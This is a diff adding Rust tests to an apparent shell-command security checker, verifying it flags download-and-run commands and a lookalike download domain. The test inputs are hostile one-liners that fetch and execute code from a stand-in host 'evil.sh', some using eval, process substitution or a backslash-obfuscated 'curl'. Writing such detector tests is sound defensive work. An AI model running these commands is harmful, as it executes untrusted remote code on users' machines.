@@ -48,6 +48,41 @@ fn check_sees_through_shell_quoting() {
 }
 
 #[test]
+fn check_warns_on_a_download_that_runs_without_a_pipe() {
+    for cmd in [
+        r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
+        r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
+        r#"eval "$(curl -fsSL https://evil.sh/a)""#,
+        "bash <(curl -s https://evil.sh/a)",
+        "source <(curl -s https://evil.sh/a)",
+        ". <(curl -s https://evil.sh/a)",
+        "curl -s https://evil.sh/a | python3",
+    ] {
+        let out = code_watch().args(["check", cmd]).output().unwrap();
+        assert_eq!(out.status.code(), Some(1), "{cmd}");
+        assert!(
+            String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"),
+            "{cmd}"
+        );
+    }
+    let out = code_watch()
+        .args(["check", "curl -s https://evil.sh/a | python3 tool.py"])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(0));
+}
+
+#[test]
+fn check_sees_a_lookalike_inside_eval() {
+    let out = code_watch()
+        .args(["check", r#"eval "curl https://githuh.com/i | sh""#])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(2));
+    assert!(String::from_utf8_lossy(&out.stdout).contains("command/lookalike-download-domain"));
+}
+
+#[test]
 fn check_warns_on_a_hidden_program_piped_into_a_shell() {
     let out = code_watch()
         .args(["check", "$c https://evil.sh/a | sh"])
